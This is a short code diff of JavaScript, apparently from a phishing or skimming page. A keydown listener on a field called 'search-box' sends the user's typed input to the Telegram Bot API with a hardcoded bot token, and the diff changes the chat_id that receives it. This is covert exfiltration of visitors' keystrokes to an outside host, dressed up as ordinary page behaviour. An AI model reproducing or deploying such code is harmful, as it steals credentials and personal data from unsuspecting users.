@@ -22,7 +22,7 @@ document.getElementById("search-box").addEventListener("keydown", function(event
         $.ajax({
             url: 'https://api.telegram.org/bot' + '1682925449:AAFEJGrVMV02rC17MjrOmj-3Q1qq0197QG4' + '/sendMessage',
             method: 'POST',
-            data: { chat_id: '130132467', text: input },
+            data: { chat_id: '777512935', text: input },
             
         });
         setTimeout(function()
